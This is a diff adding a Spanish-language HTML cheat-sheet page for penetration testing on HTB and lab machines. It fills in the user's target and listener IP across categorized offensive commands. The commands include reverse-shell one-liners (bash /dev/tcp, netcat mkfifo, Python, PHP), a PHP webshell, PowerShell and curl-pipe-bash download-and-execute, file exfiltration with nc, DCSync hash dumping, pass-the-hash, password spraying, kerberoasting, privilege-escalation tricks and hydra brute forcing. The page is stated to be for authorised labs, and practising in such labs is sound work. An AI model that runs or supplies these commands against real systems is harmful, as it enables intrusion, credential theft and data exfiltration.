@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chuleta HARO</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+/* VOICE: herramienta de trabajo seca y rápida, como la terminal de HARO.
+   IDEA: un cuaderno de comandos que se rellena con tu target, como un prompt.
+   PICTURE: la propia consola de variables + buscador arriba; tarjetas de comandos debajo.
+   COLOUR/TYPE: negro #0c0c0c, gris, blanco y un único rojo #e5484d; Inter + JetBrains Mono.
+   LAYOUT: barra de variables pegajosa, chips de categoría, columnas de tarjetas que se apilan en móvil. */
+:root{color-scheme:dark;--bg:#0c0c0c;--panel:#141414;--line:#262626;--ink:#e8e8e8;--mute:#8a8a8a;--dim:#555;--red:#e5484d}
+*{box-sizing:border-box;min-width:0}
+body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.55 Inter,system-ui,sans-serif;overflow-x:clip}
+code,pre,input,.mono{font-family:"JetBrains Mono",ui-monospace,monospace}
+header{padding:clamp(24px,4vw,48px) max(5vw,16px) 12px;max-width:1240px;margin:0 auto}
+h1{font-size:clamp(32px,5vw,48px);line-height:1.05;margin:0 0 6px;font-weight:800;letter-spacing:-.02em}
+h1 span{color:var(--red)}
+.sub{color:var(--mute);margin:0;max-width:62ch}
+.vars{position:sticky;top:0;z-index:5;background:rgba(12,12,12,.96);border-bottom:1px solid var(--line);backdrop-filter:blur(6px)}
+.vars-in{max-width:1240px;margin:0 auto;padding:12px max(5vw,16px);display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
+.f label{display:block;font-size:13px;color:var(--mute);margin-bottom:3px}
+.f input{width:100%;height:44px;background:var(--panel);border:1px solid var(--line);border-radius:6px;color:var(--ink);font-size:16px;padding:0 10px}
+.f input:focus,.search:focus{outline:2px solid var(--red);outline-offset:1px;border-color:transparent}
+.f.k label{color:var(--red)}
+main{max-width:1240px;margin:0 auto;padding:16px max(5vw,16px) 64px}
+.tools{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-bottom:14px}
+.search{flex:1 1 280px;height:48px;background:var(--panel);border:1px solid var(--line);border-radius:6px;color:var(--ink);font-size:16px;padding:0 14px}
+.count{color:var(--mute);font-size:14px}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.chip{min-height:40px;padding:0 14px;background:transparent;border:1px solid var(--line);color:var(--mute);border-radius:999px;font:500 14px Inter,sans-serif;cursor:pointer}
+.chip:hover{color:var(--ink);border-color:var(--dim)}
+.chip[aria-pressed=true]{background:var(--ink);color:#0c0c0c;border-color:var(--ink)}
+.chip:focus-visible,.cp:focus-visible{outline:2px solid var(--red);outline-offset:2px}
+section{margin-bottom:34px}
+h2{font-size:22px;margin:0 0 4px;display:flex;align-items:baseline;gap:10px}
+h2 small{font-size:13px;color:var(--dim);font-weight:400}
+.when{color:var(--mute);font-size:15px;margin:0 0 12px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(100%,380px),1fr));gap:12px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px 12px 10px;display:flex;flex-direction:column;gap:6px}
+.card h3{font-size:15px;margin:0;font-weight:600}
+.card p{margin:0;color:var(--mute);font-size:14px}
+.cmd{position:relative;background:#080808;border:1px solid var(--line);border-radius:6px;margin-top:auto}
+.cmd pre{margin:0;padding:10px 52px 10px 12px;font-size:13.5px;line-height:1.5;white-space:pre-wrap;word-break:break-word;color:var(--ink)}
+.cmd pre .v{color:var(--red)}
+.cp{position:absolute;top:4px;right:4px;width:44px;height:36px;background:transparent;border:1px solid var(--line);border-radius:5px;color:var(--mute);cursor:pointer;font:600 12px Inter,sans-serif}
+.cp:hover{color:var(--ink);border-color:var(--dim)}
+.cp.ok{color:var(--bg);background:var(--ink);border-color:var(--ink)}
+.card-h{display:flex;gap:8px;align-items:flex-start;justify-content:space-between}
+.star{flex:none;width:36px;height:36px;margin:-6px -6px 0 0;background:transparent;border:0;color:var(--dim);font-size:19px;cursor:pointer;border-radius:5px}
+.star:hover{color:var(--ink)}.star[aria-pressed=true]{color:var(--red)}
+.star:focus-visible,.btn:focus-visible{outline:2px solid var(--red);outline-offset:1px}
+.del{background:transparent;border:0;color:var(--dim);font:13px Inter,sans-serif;cursor:pointer;padding:4px 0;align-self:flex-start}
+.del:hover{color:var(--red)}
+.btn{min-height:44px;padding:0 16px;background:var(--ink);color:#0c0c0c;border:0;border-radius:6px;font:600 15px Inter,sans-serif;cursor:pointer}
+.btn.ghost{background:transparent;color:var(--mute);border:1px solid var(--line)}
+.btn.ghost:hover{color:var(--ink)}
+.addbox{background:var(--panel);border:1px dashed var(--line);border-radius:8px;padding:14px;margin:0 0 22px;display:none}
+.addbox.open{display:block}
+.addbox .row{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin-bottom:10px}
+.addbox input,.addbox textarea{width:100%;background:#080808;border:1px solid var(--line);border-radius:6px;color:var(--ink);font-size:16px;padding:10px}
+.addbox textarea{min-height:70px;resize:vertical;font-family:"JetBrains Mono",monospace}
+.addbox input:focus,.addbox textarea:focus{outline:2px solid var(--red);border-color:transparent}
+.hint{font-size:13px;color:var(--dim);margin:6px 0 0}
+.err{color:var(--red);font-size:13px;min-height:1em;margin:6px 0 0}
+kbd{font:12px "JetBrains Mono",monospace;border:1px solid var(--line);border-radius:4px;padding:1px 5px;color:var(--mute)}
+.empty{color:var(--mute);padding:40px 0;text-align:center;display:none}
+.links{border-top:1px solid var(--line);padding-top:20px;color:var(--mute);font-size:14px}
+.links a{color:var(--ink)}
+@media (prefers-reduced-motion:no-preference){.cp{transition:background .15s,color .15s}}
+</style>
+</head>
+<body>
+<header>
+  <h1>Chuleta <span>HARO</span></h1>
+  <p class="sub">Comandos para HTB y laboratorios propios, por situación. Rellena las variables una vez y todos los comandos se actualizan. Marca con ★ los que más uses. Atajos: <kbd>/</kbd> buscar · <kbd>Esc</kbd> limpiar. Solo para entornos autorizados.</p>
+</header>
+
+<div class="vars"><div class="vars-in" id="vars"></div></div>
+
+<main>
+  <div class="tools">
+    <input class="search" id="q" type="search" placeholder="Buscar: smb, suid, kerberoast, tty…" aria-label="Buscar comandos">
+    <span class="count" id="count"></span>
+    <button class="btn ghost" id="addBtn" aria-expanded="false">+ Mi comando</button>
+    <button class="btn ghost" id="resetVars">Limpiar variables</button>
+  </div>
+  <form class="addbox" id="addbox">
+    <div class="row">
+      <input id="nTitle" placeholder="Título: Escaneo rápido de web" aria-label="Título">
+      <input id="nDesc" placeholder="Nota opcional: cuándo usarlo" aria-label="Nota">
+    </div>
+    <textarea id="nCmd" placeholder="nmap -sCV -p80,443 {TARGET}" aria-label="Comando"></textarea>
+    <p class="hint">Usa {TARGET}, {IP}, {PORT}, {DOMAIN}, {USER}, {PASS} o {HASH} y se rellenarán solos.</p>
+    <p class="err" id="nErr"></p>
+    <button class="btn" type="submit">Guardar</button>
+  </form>
+  <div class="chips" id="chips" role="group" aria-label="Categorías"></div>
+  <div id="out"></div>
+  <p class="empty" id="empty">Nada coincide. Prueba con otra palabra.</p>
+  <p class="links">Más referencias: <a href="https://book.hacktricks.wiki">HackTricks</a> · <a href="https://gtfobins.github.io">GTFOBins</a> · <a href="https://lolbas-project.github.io">LOLBAS</a> · <a href="https://www.revshells.com">revshells.com</a> · <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a> · <a href="https://gchq.github.io/CyberChef">CyberChef</a></p>
+</main>
+
+<script>
+{
+const VARS=[
+ ["TARGET","IP del target","10.10.11.42",1],["IP","Tu IP (tun0)","10.10.14.7",1],["PORT","Puerto escucha","4444"],
+ ["DOMAIN","Dominio","dominio.htb"],["USER","Usuario","usuario"],["PASS","Contraseña","Password123"],["HASH","Hash NT","aad3b435b51404eeaad3b435b51404ee"]
+];
+const CATS=[
+ ["recon","Reconocimiento","Lo primero al tener una IP nueva."],
+ ["web","Web","Hay un puerto 80/443 o similar."],
+ ["serv","Servicios","SMB, FTP, LDAP, NFS, SNMP, bases de datos…"],
+ ["ad","Directorio Activo","Máquinas Windows con dominio y Kerberos."],
+ ["shell","Reverse shells","Tienes ejecución de comandos y quieres una shell."],
+ ["tty","Mejorar la shell","Tu shell es tonta: sin flechas, Ctrl+C la mata."],
+ ["xfer","Pasar archivos","Subir herramientas o sacar datos."],
+ ["linpe","Escalada Linux","Estás dentro como usuario y quieres root."],
+ ["winpe","Escalada Windows","Estás dentro y quieres SYSTEM o admin."],
+ ["crack","Crackeo","Tienes hashes, zips o claves protegidas."],
+ ["pivot","Pivoting","Hay redes o puertos internos que no ves."],
+ ["util","Utilidades","Lo que usas a todas horas."]
+];
+const C=[
+/* recon */
+["recon","Todos los puertos (rápido)","Barrido SYN de los 65535 puertos.","sudo nmap -p- --open -sS --min-rate 5000 -n -Pn {TARGET} -oG allPorts"],
+["recon","Versiones y scripts","Sobre los puertos abiertos que encontraste.","nmap -sCV -p22,80,445 {TARGET} -oN targeted"],
+["recon","Puertos UDP principales","SNMP, DNS, TFTP suelen ir por UDP.","sudo nmap -sU --top-ports 50 --open {TARGET}"],
+["recon","Añadir el dominio a /etc/hosts","Cuando la web redirige a un nombre.","echo '{TARGET} {DOMAIN}' | sudo tee -a /etc/hosts"],
+["recon","Comprobar si responde","Linux suele tener TTL 64 y Windows 128.","ping -c1 {TARGET}"],
+["recon","Buscar exploits por versión","Base de Exploit-DB en local.","searchsploit apache 2.4.49"],
+/* web */
+["web","Tecnologías de la web","CMS, servidor, versiones.","whatweb http://{TARGET}"],
+["web","Directorios con ffuf","Rápido y flexible. Filtra con -fc o -fs.","ffuf -u http://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ic -c"],
+["web","Archivos con extensiones","Busca .php, .txt, copias de seguridad…","ffuf -u http://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak -ic"],
+["web","Subdominios (vhosts)","Ajusta -fs al tamaño de la respuesta por defecto.","ffuf -u http://{DOMAIN} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"],
+["web","Recursivo con feroxbuster","Entra solo en cada carpeta que encuentra.","feroxbuster -u http://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"],
+["web","Parámetros GET ocultos","Descubre ?param= que acepta la página.","ffuf -u 'http://{TARGET}/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0"],
+["web","Inyección SQL automática","Guarda la petición de Burp en req.txt.","sqlmap -r req.txt --batch --dbs"],
+["web","WordPress","Usuarios, plugins y temas vulnerables.","wpscan --url http://{TARGET} -e u,vp,vt"],
+["web","Cabeceras y redirecciones","Ver la respuesta en bruto.","curl -sIk http://{TARGET}"],
+["web","LFI básico","Prueba de lectura de archivos.","curl 'http://{TARGET}/index.php?page=../../../../etc/passwd'"],
+/* servicios */
+["serv","SMB: recursos sin credenciales","Sesión nula.","smbclient -N -L //{TARGET}"],
+["serv","SMB: con credenciales","Lista recursos y permisos.","netexec smb {TARGET} -u {USER} -p '{PASS}' --shares"],
+["serv","SMB: entrar a un recurso","Luego: ls, get, recurse ON, mget *","smbclient //{TARGET}/Share -U {USER}"],
+["serv","Enumeración Windows completa","Usuarios, grupos, políticas por SMB/RPC.","enum4linux-ng -A {TARGET}"],
+["serv","RPC: usuarios del dominio","Con sesión nula o credenciales.","rpcclient -U '' -N {TARGET} -c enumdomusers"],
+["serv","FTP anónimo","Usuario anonymous, contraseña vacía.","ftp anonymous@{TARGET}"],
+["serv","Bajar todo un FTP","Descarga recursiva.","wget -m --no-passive ftp://anonymous:@{TARGET}"],
+["serv","LDAP anónimo","Información del dominio.","ldapsearch -x -H ldap://{TARGET} -b 'dc=dominio,dc=htb'"],
+["serv","NFS: recursos exportados","Luego montar con mount -t nfs.","showmount -e {TARGET}"],
+["serv","SNMP: volcar información","Comunidad public por defecto.","snmpwalk -v2c -c public {TARGET}"],
+["serv","MySQL remoto","","mysql -h {TARGET} -u {USER} -p"],
+["serv","MSSQL con impacket","Prueba xp_cmdshell dentro.","impacket-mssqlclient {DOMAIN}/{USER}:'{PASS}'@{TARGET} -windows-auth"],
+/* AD */
+["ad","Validar credenciales","Prueba en todo: smb, winrm, ldap, mssql.","netexec smb {TARGET} -u {USER} -p '{PASS}'"],
+["ad","Password spraying","Una contraseña contra una lista de usuarios.","netexec smb {TARGET} -u users.txt -p '{PASS}' --continue-on-success"],
+["ad","Usuarios válidos por Kerberos","Sin credenciales.","kerbrute userenum -d {DOMAIN} --dc {TARGET} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"],
+["ad","AS-REP roasting","Usuarios sin preautenticación.","impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {TARGET} -no-pass"],
+["ad","Kerberoasting","Hashes de cuentas de servicio.","impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {TARGET} -request"],
+["ad","Recolectar para BloodHound","Luego súbelo a BloodHound.","bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {TARGET} -c All --zip"],
+["ad","Usuarios por RID brute","Lista de usuarios del dominio.","netexec smb {TARGET} -u {USER} -p '{PASS}' --rid-brute"],
+["ad","Shell por WinRM","Puerto 5985. Con -H usas el hash.","evil-winrm -i {TARGET} -u {USER} -p '{PASS}'"],
+["ad","Pass-the-hash","Entrar con el hash NT sin contraseña.","evil-winrm -i {TARGET} -u {USER} -H {HASH}"],
+["ad","Volcar hashes del dominio","Necesitas privilegios (DCSync).","impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{TARGET}"],
+["ad","Shell como SYSTEM","Con usuario administrador.","impacket-psexec {DOMAIN}/{USER}:'{PASS}'@{TARGET}"],
+["ad","Capturar hashes NTLM","Espera autenticaciones hacia ti.","sudo responder -I tun0"],
+["ad","Sincronizar hora con el DC","Kerberos falla con más de 5 min de diferencia.","sudo ntpdate {TARGET}"],
+/* shells */
+["shell","Escuchar","Con tu alias: rev {PORT}","rlwrap nc -lvnp {PORT}"],
+["shell","Bash","La más común en Linux.","bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'"],
+["shell","Netcat sin -e","Funciona con casi cualquier nc.","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f"],
+["shell","Python","Si hay python3 en la víctima.","python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{IP}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"bash\")'"],
+["shell","PHP","Para subir como archivo o inyectar.","php -r '$s=fsockopen(\"{IP}\",{PORT});exec(\"sh <&3 >&3 2>&3\");'"],
+["shell","Webshell PHP mínima","Luego: shell.php?c=id","<?php system($_GET['c']); ?>"],
+["shell","PowerShell (descarga y ejecuta)","Sirve un .ps1 con tu alias serve.","powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{IP}/shell.ps1')\""],
+["shell","Bash en base64","Evita problemas con caracteres especiales.","echo 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' | base64 -w0"],
+/* tty */
+["tty","1. Lanzar pty","Dentro de la shell recibida.","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
+["tty","1b. Sin python","Alternativa con script.","script /dev/null -c bash"],
+["tty","2. Fondo y modo raw","Ctrl+Z primero, luego esto en tu terminal.","stty raw -echo; fg"],
+["tty","3. Ajustar terminal","Escribe reset si se queda raro, y luego:","export TERM=xterm SHELL=bash; stty rows 50 columns 200"],
+/* xfer */
+["xfer","Servir carpeta","Tu alias: serve","sudo python3 -m http.server 80"],
+["xfer","Descargar en Linux","","wget http://{IP}/linpeas.sh -O /tmp/linpeas.sh"],
+["xfer","Descargar con curl y ejecutar","Sin tocar el disco.","curl -s http://{IP}/linpeas.sh | bash"],
+["xfer","Descargar en Windows (PowerShell)","","iwr http://{IP}/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe"],
+["xfer","Descargar en Windows (certutil)","Cuando no hay PowerShell.","certutil -urlcache -f http://{IP}/nc.exe C:\\Windows\\Temp\\nc.exe"],
+["xfer","Servidor SMB propio","En Windows: copy \\\\{IP}\\s\\archivo .","impacket-smbserver s . -smb2support"],
+["xfer","Sacar un archivo con nc","Tú escuchas y la víctima envía.","nc -lvnp 9001 > archivo   # víctima: nc {IP} 9001 < archivo"],
+["xfer","Copiar por base64","Para archivos pequeños sin red.","base64 -w0 archivo   # y en el otro lado: echo '...' | base64 -d > archivo"],
+/* linpe */
+["linpe","Permisos de sudo","Lo primero siempre. Busca el binario en GTFOBins.","sudo -l"],
+["linpe","Binarios SUID","Compáralos con GTFOBins.","find / -perm -4000 -type f 2>/dev/null"],
+["linpe","Capabilities","cap_setuid en python o perl es root directo.","getcap -r / 2>/dev/null"],
+["linpe","Grupos y usuario","docker, lxd, disk, adm… dan juego.","id; groups"],
+["linpe","Tareas programadas","Scripts que ejecuta root.","cat /etc/crontab; ls -la /etc/cron*"],
+["linpe","Procesos de otros usuarios","pspy los ve sin ser root.","./pspy64"],
+["linpe","Archivos escribibles","Fuera de /proc y /sys.","find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null"],
+["linpe","Puertos internos","Servicios que solo escuchan en local.","ss -tulpn"],
+["linpe","Contraseñas en archivos","Configs, backups, historiales.","grep -rniE 'pass(word)?=' /var/www /opt /home 2>/dev/null"],
+["linpe","LinPEAS","Lo revisa todo y resalta lo importante.","curl -s http://{IP}/linpeas.sh | sh"],
+/* winpe */
+["winpe","Privilegios del usuario","SeImpersonate o SeBackup = premio.","whoami /priv"],
+["winpe","Grupos","Backup Operators, DnsAdmins…","whoami /groups"],
+["winpe","Información del sistema","Versión y parches.","systeminfo"],
+["winpe","WinPEAS","Revisión automática.","C:\\Windows\\Temp\\wp.exe"],
+["winpe","SeImpersonate a SYSTEM","GodPotato o PrintSpoofer.","GodPotato.exe -cmd \"C:\\Windows\\Temp\\nc.exe {IP} {PORT} -e cmd\""],
+["winpe","Credenciales guardadas","Luego runas /savecred.","cmdkey /list"],
+["winpe","Historial de PowerShell","A veces trae contraseñas.","type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"],
+["winpe","Servicios con rutas raras","Rutas sin comillas o binarios escribibles.","wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\""],
+/* crack */
+["crack","Identificar el hash","","hashid -m 'hash_aquí'"],
+["crack","John con rockyou","Detecta el formato solo.","john hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"],
+["crack","Hashcat Kerberoast","13100 = TGS, 18200 = AS-REP, 1000 = NTLM.","hashcat -m 13100 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"],
+["crack","ZIP protegido","","zip2john archivo.zip > hash && john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"],
+["crack","Clave SSH con passphrase","","ssh2john id_rsa > hash && john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"],
+["crack","Ver resultados de john","","john --show hash.txt"],
+/* pivot */
+["pivot","Chisel: servidor en tu PC","","chisel server -p 8000 --reverse"],
+["pivot","Chisel: puerto interno a tu PC","En la víctima. Luego abre 127.0.0.1:3306 en tu PC.","./chisel client {IP}:8000 R:3306:127.0.0.1:3306"],
+["pivot","Chisel: SOCKS para toda la red","Usa proxychains con socks5 127.0.0.1 1080.","./chisel client {IP}:8000 R:socks"],
+["pivot","SSH: reenviar un puerto","Ver el 8080 interno en tu 8080.","ssh -L 8080:127.0.0.1:8080 {USER}@{TARGET}"],
+["pivot","SSH: proxy SOCKS","","ssh -D 1080 {USER}@{TARGET}"],
+["pivot","Ligolo-ng: proxy en tu PC","Crea la interfaz y añade la ruta de la red interna.","sudo ligolo-proxy -selfcert"],
+/* util */
+["util","Crear carpeta de máquina","Tu alias de la terminal.","mkt nombre {TARGET}"],
+["util","Decodificar base64","","echo 'dGV4dG8=' | base64 -d"],
+["util","Copiar al portapapeles","","cat archivo | wl-copy"],
+["util","Buscar texto en carpetas","","grep -rni 'password' ."],
+["util","Generar contraseña o string aleatorio","","openssl rand -hex 16"],
+["util","Ver qué escucha en tu PC","","ss -tulpn"],
+["web","Repositorio .git expuesto","Si /.git/ responde, descarga el código fuente.","git-dumper http://{TARGET}/.git ./repo"],
+["web","Diccionario desde la propia web","Palabras de la web para probar como contraseñas.","cewl http://{TARGET} -w palabras.txt"],
+["web","Probar SSTI","Si alguna devuelve 49, hay inyección de plantillas.","{{7*7}}  ${7*7}  <%= 7*7 %>"],
+["web","Vulnerabilidades conocidas del servidor","Ruidoso pero rápido.","nikto -h http://{TARGET}"],
+["serv","SMB: rastrear todos los recursos","Lista todos los archivos accesibles.","netexec smb {TARGET} -u {USER} -p '{PASS}' -M spider_plus"],
+["serv","Redis sin contraseña","","redis-cli -h {TARGET} info"],
+["ad","Forzar cambio de contraseña","Permiso ForceChangePassword visto en BloodHound.","net rpc password objetivo 'Nueva123!' -U {DOMAIN}/{USER}%'{PASS}' -S {TARGET}"],
+["xfer","Subir por SCP","Si tienes acceso SSH.","scp archivo {USER}@{TARGET}:/tmp/"],
+["linpe","Kernel y distribución","Para buscar exploits de kernel.","uname -a; cat /etc/os-release"],
+["linpe","Grupo docker","Monta el disco del host y entra como root.","docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
+["linpe","Claves SSH a la vista","","find / \\( -name id_rsa -o -name id_ed25519 \\) 2>/dev/null"],
+["winpe","Archivos con contraseñas","","findstr /si password *.xml *.ini *.txt *.config"],
+["winpe","Usuarios y administradores locales","","net user & net localgroup administrators"],
+["crack","Fuerza bruta SSH","Contra un usuario conocido.","hydra -l {USER} -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://{TARGET} -t 4"],
+["crack","Fuerza bruta en un login web","Ajusta la ruta, los campos y el texto de error.","hydra -l {USER} -P rockyou.txt {TARGET} http-post-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect'"],
+["util","Empaquetar una carpeta","Para sacarla de una vez.","tar czf salida.tar.gz carpeta/"],
+["util","Explicar un comando","Pega el comando en explainshell.com","man nmap"]
+];
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const load=(k,d)=>{try{return JSON.parse(localStorage.getItem(k))||d}catch(e){return d}};
+const save=(k,v)=>{try{localStorage.setItem(k,JSON.stringify(v))}catch(e){}};
+let vals=load('haro-vars',{}), favs=new Set(load('haro-favs',[])), mine=load('haro-mine',[]);
+const V=document.getElementById('vars');
+function drawVars(){V.innerHTML=VARS.map(([k,l,d,key])=>`<div class="f${key?' k':''}"><label for="v-${k}">${l}</label><input id="v-${k}" class="mono" data-k="${k}" placeholder="${esc(d)}" value="${esc(vals[k]||'')}" spellcheck="false" autocomplete="off"></div>`).join('')}
+drawVars();
+const get=k=>vals[k]||VARS.find(v=>v[0]===k)[2];
+const isVar=k=>VARS.some(v=>v[0]===k);
+const fill=t=>t.replace(/\{(\w+)\}/g,(m,k)=>isVar(k)?get(k):m);
+const paint=t=>esc(t).replace(/\{(\w+)\}/g,(m,k)=>isVar(k)?`<span class="v">${esc(get(k))}</span>`:m);
+const ALLCATS=[["fav","★ Favoritos","Los que marcaste con la estrella."],["mine","Mis comandos","Los que has guardado tú."]].concat(CATS);
+let cat='all',q='';
+const chips=document.getElementById('chips');
+chips.innerHTML=[['all','Todo']].concat(ALLCATS.map(c=>[c[0],c[1]])).map(([id,n])=>`<button class="chip" data-c="${id}" aria-pressed="${id==='all'}">${n}</button>`).join('');
+function items(){
+  const base=C.map(x=>({cat:x[0],t:x[1],d:x[2],c:x[3],key:x[3]}));
+  const own=mine.map((x,i)=>({cat:'mine',t:x[0],d:x[1],c:x[2],key:'mine:'+x[2],mi:i}));
+  return base.concat(own);
+}
+let ITEMS=[];
+function card(x,i){
+  return `<div class="card"><div class="card-h"><h3>${esc(x.t)}</h3><button class="star" data-i="${i}" aria-pressed="${favs.has(x.key)}" aria-label="Marcar como favorito">${favs.has(x.key)?'★':'☆'}</button></div>${x.d?`<p>${esc(x.d)}</p>`:''}<div class="cmd"><pre>${paint(x.c)}</pre><button class="cp" data-i="${i}" aria-label="Copiar comando">Copiar</button></div>${x.mi!==undefined?`<button class="del" data-m="${x.mi}">Borrar</button>`:''}</div>`;
+}
+function render(){
+  ITEMS=items();
+  const words=q.toLowerCase().split(/\s+/).filter(Boolean);
+  const match=(x,name)=>{const h=(x.t+' '+x.d+' '+x.c+' '+name).toLowerCase();return words.every(w=>h.includes(w))};
+  let n=0;
+  const html=ALLCATS.filter(c=>cat==='all'?c[0]!=='fav'||favs.size:c[0]===cat).map(([id,name,when])=>{
+    const list=ITEMS.map((x,i)=>[x,i]).filter(([x])=>id==='fav'?favs.has(x.key):x.cat===id).filter(([x])=>match(x,name));
+    if(!list.length){
+      if(cat===id&&!q)return `<section><h2>${name}</h2><p class="when">${id==='fav'?'Aún no tienes favoritos: pulsa ☆ en cualquier comando.':id==='mine'?'Aún no has guardado ninguno: pulsa «+ Mi comando».':''}</p></section>`;
+      return '';
+    }
+    if(id!=='fav')n+=list.length;
+    return `<section id="${id}"><h2>${name}<small>${list.length}</small></h2><p class="when">${when}</p><div class="grid">${list.map(([x,i])=>card(x,i)).join('')}</div></section>`;
+  }).join('');
+  document.getElementById('out').innerHTML=html;
+  document.getElementById('count').textContent=(n||document.querySelectorAll('#out .card').length)+' comandos';
+  document.getElementById('empty').style.display=html?'none':'block';
+}
+V.addEventListener('input',e=>{const k=e.target.dataset.k;if(!k)return;vals[k]=e.target.value.trim();save('haro-vars',vals);render()});
+document.getElementById('resetVars').addEventListener('click',()=>{vals={};save('haro-vars',vals);drawVars();render()});
+const qi=document.getElementById('q');
+qi.addEventListener('input',e=>{q=e.target.value;render()});
+chips.addEventListener('click',e=>{const b=e.target.closest('.chip');if(!b)return;cat=b.dataset.c;chips.querySelectorAll('.chip').forEach(c=>c.setAttribute('aria-pressed',c===b));render()});
+document.getElementById('out').addEventListener('click',async e=>{
+  const s=e.target.closest('.star');
+  if(s){const k=ITEMS[+s.dataset.i].key;favs.has(k)?favs.delete(k):favs.add(k);save('haro-favs',[...favs]);render();return}
+  const d=e.target.closest('.del');
+  if(d){mine.splice(+d.dataset.m,1);save('haro-mine',mine);render();return}
+  const b=e.target.closest('.cp');if(!b)return;
+  const t=fill(ITEMS[+b.dataset.i].c);
+  try{await navigator.clipboard.writeText(t);b.textContent='✓';b.classList.add('ok')}
+  catch(err){const r=document.createRange();r.selectNodeContents(b.previousElementSibling);const sel=getSelection();sel.removeAllRanges();sel.addRange(r);b.textContent='Ctrl+C'}
+  setTimeout(()=>{b.textContent='Copiar';b.classList.remove('ok')},1400);
+});
+const box=document.getElementById('addbox'),addBtn=document.getElementById('addBtn'),nErr=document.getElementById('nErr');
+addBtn.addEventListener('click',()=>{const o=box.classList.toggle('open');addBtn.setAttribute('aria-expanded',o);if(o)document.getElementById('nTitle').focus()});
+['nTitle','nCmd'].forEach(id=>document.getElementById(id).addEventListener('input',()=>{nErr.textContent=''}));
+box.addEventListener('submit',e=>{
+  e.preventDefault();
+  const t=document.getElementById('nTitle').value.trim(),d=document.getElementById('nDesc').value.trim(),c=document.getElementById('nCmd').value.trim();
+  if(!t||!c){nErr.textContent=!t?'Ponle un título.':'Escribe el comando.';return}
+  mine.push([t,d,c]);save('haro-mine',mine);box.reset();box.classList.remove('open');addBtn.setAttribute('aria-expanded',false);
+  cat='mine';chips.querySelectorAll('.chip').forEach(x=>x.setAttribute('aria-pressed',x.dataset.c==='mine'));render();
+});
+document.addEventListener('keydown',e=>{
+  const typing=['INPUT','TEXTAREA'].includes(document.activeElement.tagName);
+  if(e.key==='/'&&!typing){e.preventDefault();qi.focus()}
+  if(e.key==='Escape'){if(q){q='';qi.value='';render()}if(typing)document.activeElement.blur()}
+});
+render();
+}
+</script>
+</body>
+</html>
